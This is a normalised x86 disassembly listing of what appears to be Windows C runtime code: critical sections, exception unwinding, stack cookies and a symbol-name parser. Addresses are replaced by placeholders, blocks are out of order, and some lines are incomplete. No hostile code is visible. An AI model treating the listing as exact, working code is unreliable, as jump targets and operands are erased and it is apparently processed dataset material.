mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x8
call sub_4100c1
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d4a2
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410480
mov eax [ rw-data ]
push edi
push 0x20
and eax 0x1f
mov edi rw-data
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push 0x9
pop ecx
[ edi ]
pop edi
retn
sub_4104a4
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push esi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
cmp [ esi ] 0x0
je r-xdata
pop esi
and [ esi ] 0x0
push [ esi ]
call [ FreeLibrary@IAT ]
sub_4104e0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_410570
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_4167d5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4167f4
jmp r-xdata
sub_410570
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40c38e
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_4104e0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4105b6
push ebp
push [ esp + 0x8 ]
call sub_40fef1
add esp 0x4
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_4104e0
add esp 0xc
pop ebp
retn 0x4
sub_4105de
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_41060e
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41063e
push esi
push edi
mov edi rw-data
xor esi esi
call sub_41068f
xor al al
inc [ rw-data ]
add esi 0x18
add edi 0x18
cmp esi 0x18
jb r-xdata
push 0x0
push 0xfa0
push edi
call sub_41043a
add esp 0xc
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_41068f
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
imul eax esi 0x18
push edi
lea edi [ eax + rw-data ]
push edi
call [ DeleteCriticalSection@IAT ]
dec [ rw-data ]
sub edi 0x18
sub esi 0x1
jne r-xdata
pop edi
sub_41072b
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] 0x2
cmp [ ecx ] 0x0
je r-xdata
mov [ esi + 0x4 ] 0x1
jmp r-xdata
xor edx edx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edx
push ecx
mov ecx esi
call sub_411f88
mov eax [ edi ]
mov cl [ eax ]
test cl cl
je r-xdata
cmp al 0x5f
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc eax
mov [ edi ] eax
cmp cl [ ebp + 0xc ]
je r-xdata
lea eax [ ebx + 0x1 ]
inc edx
mov [ edi ] eax
cmp [ eax ] 0x0
jne r-xdata
cmp al 0x24
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x3
jmp r-xdata
mov ebx [ edi ]
mov al [ ebx ]
cmp al [ ebp + 0xc ]
je r-xdata
cmp al 0x3c
je r-xdata
cmp al 0x3e
je r-xdata
cmp al 0x2d
je r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x7a
jle r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x5a
jle r-xdata
cmp al 0x80
jb r-xdata
cmp al 0x39
jle r-xdata
test [ rw-data ] 0x10000
je r-xdata
cmp al 0xfe
jbe r-xdata
sub_4107fa
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_411f88
sub_410826
push ebp
mov ebp esp
push ebx
xor ebx ebx
push esi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ esi + 0x4 ] bl
push ebx
push 0x8
mov ecx rw-data
call sub_413de0
test eax eax
je r-xdata
test ebx ebx
setne al
dec al
and al 0x3
mov [ esi + 0x4 ] al
jmp r-xdata
push [ ebp + 0x8 ]
mov ecx eax
call sub_410ab5
mov ebx eax
and [ esi + 0x4 ] 0xffff00ff
mov eax esi
mov [ esi ] ebx
pop esi
pop ebx
pop ebp
retn 0x4
sub_410873
push ebp
mov ebp esp
push esi
mov esi ecx
xor eax eax
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
test ecx ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ ecx ] al
je r-xdata
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
test eax eax
je r-xdata
push eax
push ecx
mov ecx esi
call sub_411f88
sub_4108ad
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0xffff00ff
cmp eax 0x2
je r-xdata
mov ecx eax
cmp eax 0x3
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push eax
call sub_416436
mov [ esi ] eax
pop ecx
test eax eax
jne r-xdata
xor ecx ecx
jmp r-xdata
mov [ esi + 0x4 ] 0x3
and [ esi ] 0x0
mov [ esi + 0x4 ] cl
cmp eax 0x1
jne r-xdata
sub_410901
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
mov eax ecx
xor ecx ecx
mov [ ebp - 0x24 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ ebp - 0x7 ]
mov [ eax + 0x4 ] cl
and [ eax + 0x4 ] 0xffff00ff
mov [ eax ] ecx
mov [ ebp - 0x7 ] cl
mov [ ebp - 0x1d ] cl
cmp edx ecx
jg r-xdata
push ebx
jl r-xdata
push ebx
push ecx
push 0xa
push edx
push edi
dec esi
call sub_448b80
mov [ ebp - 0x28 ] ebx
pop ebx
add cl 0x30
mov edi eax
or eax edx
mov [ esi ] cl
push 0x0
pop ecx
jne r-xdata
pop ebx
cmp [ ebp - 0x1d ] cl
je r-xdata
neg edi
mov [ ebp - 0x1d ] 0x1
adc edx ecx
neg edx
cmp edi ecx
jae r-xdata
lea ecx [ ebp - 0x7 ]
sub ecx esi
push ecx
mov ecx [ ebp - 0x24 ]
push esi
call sub_411f88
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
xor ecx ebp
pop edi
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
dec esi
mov [ esi ] 0x2d
sub_410996
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] 0x0
push edi
lea edi [ ebp - 0x8 ]
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
push ebx
push 0x0
push 0xa
push edx
push ebx
dec edi
call sub_448b80
mov [ ebp - 0x20 ] ebx
pop ebx
add cl 0x30
mov ebx eax
or eax edx
mov [ edi ] cl
jne r-xdata
lea ecx [ ebp - 0x8 ]
sub ecx edi
push ecx
push edi
mov ecx esi
call sub_411f88
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x8
sub_410a0e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
dec eax
neg eax
mov [ ecx ] r--data
sbb eax eax
and eax 0xfffffffc
add eax 0x4
mov [ ecx + 0x8 ] eax
mov eax ecx
pop ebp
retn 0x4
sub_410a37
push ebp
mov ebp esp
or [ ecx ] 0xffffffff
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
lea esi [ ecx + 0x2c ]
or [ esi ] 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] eax
test edx edx
je r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov eax [ ebp + 0x10 ]
mov [ rw-data ] eax
mov [ rw-data ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
mov [ rw-data ] esi
mov [ rw-data ] eax
mov eax ecx
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
pop esi
pop ebp
retn 0x14
sub_410ab5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
test eax eax
je r-xdata
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x4
mov dl [ eax + 0x4 ]
cmp dl 0x2
je r-xdata
xor eax eax
cmp dl 0x3
jne r-xdata
sub_410afc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0xc ]
mov [ esi ] r--data
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x0
push edi
mov ecx rw-data
call sub_413de0
mov ecx eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ecx
test ecx ecx
je r-xdata
and [ esi + 0x8 ] 0x0
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub ebx ecx
mov al [ ebx + ecx ]
mov [ ecx ] al
inc ecx
sub edi 0x1
jne r-xdata
jmp r-xdata
sub_410b80
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_411f88
sub_410bac
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ esi + 0x4 ] 0x3
push ebx
push 0x8
mov ecx rw-data
call sub_413de0
test eax eax
je r-xdata
mov [ esi ] ebx
test ebx ebx
jne r-xdata
push [ ebp + 0x8 ]
mov ecx eax
call sub_410ab5
mov ebx eax
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
sub_410bf5
push ebp
mov ebp esp
push esi
mov esi ecx
xor eax eax
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
cmp [ ecx ] al
je r-xdata
push eax
push ecx
mov ecx esi
call sub_411f88
mov eax esi
pop esi
pop ebp
retn 0x4
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_410c27
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] al
cmp eax 0x1
jne r-xdata
and [ esi ] 0x0
push eax
call sub_416436
mov [ esi ] eax
pop ecx
test eax eax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x3
jmp r-xdata
sub_410c5c
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
cmp edx 0x9
ja r-xdata
push 0x3
cmp [ ecx ] 0xffffffff
je r-xdata
push 0x2
jmp r-xdata
cmp edx [ ecx ]
jg r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4108ad
mov eax [ ebp + 0x8 ]
mov edx [ ecx + edx * 4 + 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
pop ebp
retn 0x8
sub_410c98
push ebp
mov ebp esp
sub esp 0x20
mov ecx [ ebp - 0xc ]
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and ecx eax
mov eax [ rw-data ]
xor edx edx
mov [ ebp - 0x8 ] edx
push esi
mov esi 0x1000
test eax eax
je r-xdata
cmp cl 0x3
jne r-xdata
cmp [ eax ] 0x3f
jne r-xdata
cmp cl 0x2
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_4130d6
pop ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov al [ eax + 0x1 ]
cmp al 0x40
jne r-xdata
push [ rw-data ]
lea ecx [ ebp - 0x8 ]
call sub_410bf5
test [ rw-data ] esi
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x24
jne r-xdata
add [ rw-data ] 0x2
lea eax [ ebp - 0x18 ]
push eax
call sub_4130d6
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_410873
mov ecx eax
call sub_410e7f
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
jmp r-xdata
push [ rw-data ]
lea ecx [ ebp - 0x8 ]
push eax
call sub_414fb0
mov eax [ rw-data ]
mov ecx eax
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_4163b4
mov esi [ rw-data ]
inc eax
mov [ rw-data ] eax
mov ecx esi
add eax 0x7
and eax 0xfffffff8
push eax
call j_sub_40d4a2
call esi
mov [ rw-data ] eax
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp al 0x3f
jne r-xdata
push edx
lea eax [ ebp - 0x20 ]
push eax
call sub_4157cb
pop ecx
pop ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
cmp cl 0x2
je r-xdata
mov dl [ eax ]
test dl dl
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x40
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
test [ rw-data ] esi
jne r-xdata
cmp dl 0x20
jne r-xdata
mov al dl
mov [ ecx ] al
mov eax [ rw-data ]
and ecx 0xffff0002
or ecx 0x2
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ ecx ] dl
inc ecx
inc eax
inc eax
mov [ ecx ] dl
inc ecx
jmp r-xdata
cmp [ eax ] 0x20
je r-xdata
inc eax
jmp r-xdata
sub_410e13
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_410e37
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_410873
mov ecx eax
call sub_410e7f
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_410e5b
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4108ad
mov ecx eax
call sub_410e7f
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_410e7f
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_410f29
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410ea1
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_410f6c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410ec3
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_410fbc
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410ee5
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_411021
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410f07
push ebp
mov ebp esp
mov edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] edx
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx esi
call sub_411082
mov eax esi
pop esi
pop ebp
retn 0x8
sub_410f29
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
movsx eax [ ecx + 0x4 ]
mov ecx esi
push eax
call sub_411082
jmp r-xdata
push [ ecx ]
mov ecx esi
call sub_41119b
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_410f6c
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push ebx
mov ebx [ ebp + 0x8 ]
test bl bl
je r-xdata
pop ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x0
push 0x8
mov ecx rw-data
call sub_413de0
test eax eax
je r-xdata
push ebx
call sub_410b80
jmp r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] bl
jmp r-xdata
push eax
mov ecx esi
call sub_41119b
sub_410fbc
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
pop edi
push ebx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
mov al [ edi + 0x4 ]
test al al
je r-xdata
push edi
call sub_410bac
jmp r-xdata
push ebx
push 0x8
mov ecx rw-data
call sub_413de0
test eax eax
je r-xdata
cmp al 0x1
je r-xdata
pop ebx
push ebx
mov ecx esi
call sub_41119b
push edi
mov ecx eax
call sub_410ab5
mov ebx eax
movsx eax al
push eax
call sub_411082
jmp r-xdata
sub_411021
push ebp
mov ebp esp
push ebx
mov ebx ecx
cmp [ ebx + 0x4 ] 0x1
jg r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
pop edi
cmp [ edi ] 0x0
je r-xdata
push esi
xor esi esi
cmp [ ebx ] esi
jne r-xdata
push esi
push 0xc
mov ecx rw-data
call sub_413de0
test eax eax
je r-xdata
push edi
call sub_410bf5
jmp r-xdata
push esi
mov ecx ebx
call sub_41119b
cmp [ edi ] 0x0
je r-xdata
pop esi
push esi
push edi
mov ecx eax
call sub_410afc
mov esi eax
inc esi
cmp [ esi + edi ] 0x0
jne r-xdata
sub_411082
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
push eax
call sub_410c27
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
test eax eax
je r-xdata
push eax
call sub_416436
pop ecx
push eax
mov ecx esi
call sub_41119b
jmp r-xdata
sub_4110c2
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi ] 0x9
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x0
je r-xdata
pop edi
push 0x0
push 0x8
mov ecx rw-data
call sub_413de0
mov edx eax
test edx edx
je r-xdata
xor edx edx
mov ecx [ edi ]
mov [ edx ] ecx
mov ecx [ edi + 0x4 ]
mov [ edx + 0x4 ] ecx
jmp r-xdata
inc [ esi ]
mov eax [ esi ]
mov [ esi + eax * 4 + 0x4 ] edx
test edx edx
je r-xdata
sub_411145
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
retn
mov eax [ edi + 0x8 ]
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
push esi
mov eax [ edi + 0xc ]
mov esi [ edi + 0x4 ]
mov ecx esi
push [ edi + 0xc ]
mov eax [ eax ]
mov [ edi + 0x8 ] eax
call j_sub_40d4a2
call esi
mov eax [ edi + 0x8 ]
mov [ edi + 0xc ] eax
pop ecx
test eax eax
jne r-xdata
pop esi
sub_41119b
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
mov [ esi + 0x4 ] 0x3
push 0x0
push 0x10
mov ecx rw-data
call sub_413de0
test eax eax
je r-xdata
xor eax eax
mov ecx [ esi ]
or [ eax + 0xc ] 0xffffffff
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
sub_4111e1
push ebp
mov ebp esp
sub esp 0x64
and [ ebp - 0x30 ] 0xffff0000
xor eax eax
push ebx
push esi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x34 ] eax
call sub_4159e5
mov esi [ ebp + 0xc ]
mov ebx eax
xor eax eax
xor ecx ecx
inc eax
cmp [ esi ] ecx
je r-xdata
mov [ ebp - 0x1c ] ecx
test [ esi + 0x4 ] 0x200
mov [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx 0xfffe
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_4108ad
cmp ebx 0xffff
jne r-xdata
cmp ebx 0xfffd
jne r-xdata
push esi
push eax
push [ ebp + 0x8 ]
call sub_410e5b
add esp 0xc
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi ebx
and edi 0x8000
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
push esi
lea ecx [ ebp - 0x34 ]
call sub_410f29
mov ecx 0x7c00
test edi edi
jne r-xdata
mov eax ebx
xor edx edx
and eax 0x1800
cmp eax 0x800
mov [ ebp - 0x28 ] eax
mov eax ebx
sete dl
mov [ ebp - 0x10 ] edx
test edx edx
je r-xdata
mov eax ebx
and eax 0xfc00
cmp eax ecx
jne r-xdata
mov eax ebx
and eax ecx
cmp eax 0x6800
je r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
mov eax ebx
mov esi 0x1800
test edi edi
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
push [ ebp + 0x8 ]
call sub_415f35
lea eax [ ebp - 0x34 ]
push eax
push [ ebp + 0x8 ]
call sub_415f8b
jmp r-xdata
test edi edi
jne r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax 0x1000
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
pop edi
pop ecx
pop ecx
mov eax ebx
and eax ecx
cmp eax 0x7000
jne r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
and eax edx
and eax 0x400
jmp r-xdata
neg eax
mov edx 0x1000
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
test edi edi
jne r-xdata
test ebx 0x4000
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax 0x1100
je r-xdata
test eax eax
je r-xdata
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
mov ecx edi
and eax 0x1b00
sub eax edx
neg eax
sbb eax eax
inc eax
neg ecx
sbb ecx ecx
test eax ecx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
and eax ecx
cmp eax 0x6000
jne r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax [ rw-data ]
mov ecx eax
shr ecx 0x3
shr eax 0x1
not ecx
not eax
and ecx eax
test cl 0x1
je r-xdata
cmp eax 0x1200
je r-xdata
and eax 0x6000
and eax esi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_413322
mov eax [ ebp - 0x34 ]
pop ecx
pop ecx
mov [ ebp - 0x54 ] eax
lea ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x30 ]
push 0x7b
mov [ ebp - 0x50 ] eax
call sub_410f6c
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x44 ]
push eax
call sub_410f29
push r--data
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x4c ]
call sub_410ee5
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_412452
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_41110c
lea eax [ ebp - 0x4c ]
push eax
call sub_412452
pop ecx
push eax
lea eax [ ebp - 0x54 ]
push eax
push 0x20
lea ecx [ ebp - 0x44 ]
call sub_4107fa
mov ecx eax
call sub_410e7f
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
and eax edx
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_411021
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x40 ] 0xffff0000
mov eax 0xffff0000
and [ ebp - 0x48 ] eax
and [ ebp - 0x50 ] eax
and [ ebp - 0x38 ] eax
mov eax [ ebp - 0x50 ]
and eax 0xffff0000
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x28 ] eax
mov eax ebx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x44 ] ecx
test edx edx
je r-xdata
cmp [ ebp - 0x28 ] 0x1800
jne r-xdata
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
mov ecx edi
and eax 0x1b00
sub eax 0x1100
neg eax
sbb eax eax
inc eax
neg ecx
sbb ecx ecx
test eax ecx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
and eax 0x6000
mov eax ebx
and eax esi
sub eax 0x800
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
push ecx
lea eax [ ebp - 0x54 ]
push eax
call sub_413322
pop ecx
pop ecx
lea eax [ ebp - 0x54 ]
mov ecx esi
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x7b
lea eax [ ebp - 0x44 ]
push eax
call sub_410ea1
mov ecx eax
call sub_410e7f
push eax
lea ecx [ ebp - 0x34 ]
call sub_410f29
lea eax [ ebp - 0x54 ]
push eax
call sub_415ee5
mov esi 0x1000
pop ecx
